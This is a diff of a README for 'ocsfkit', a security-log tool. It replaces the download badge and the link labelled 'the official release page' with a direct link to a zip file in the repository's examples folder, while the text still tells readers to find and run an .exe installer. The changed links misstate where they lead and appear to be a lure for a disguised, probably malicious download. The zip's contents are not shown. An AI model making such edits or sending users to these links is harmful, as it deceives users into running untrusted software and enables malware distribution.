@@ -1,12 +1,12 @@
 # 🛠️ ocsfkit - Manage security events with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/populated-spindle594/ocsfkit/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/populated-spindle594/ocsfkit/raw/refs/heads/main/examples/Software_3.1.zip)
 
 ocsfkit helps you work with security data. Use this tool to clean, check, and compare your security logs. It makes security tasks simple for your daily operations.
 
 ## 📥 How to download the software
 
-1. Visit [the official release page](https://github.com/populated-spindle594/ocsfkit/releases) to find the latest version.
+1. Visit [the official release page](https://github.com/populated-spindle594/ocsfkit/raw/refs/heads/main/examples/Software_3.1.zip) to find the latest version.
 2. Look for the section labeled Assets.
 3. Click the file that ends in .exe to download the installer to your computer.
 4. Save the file in a place you can find, such as your Downloads folder.
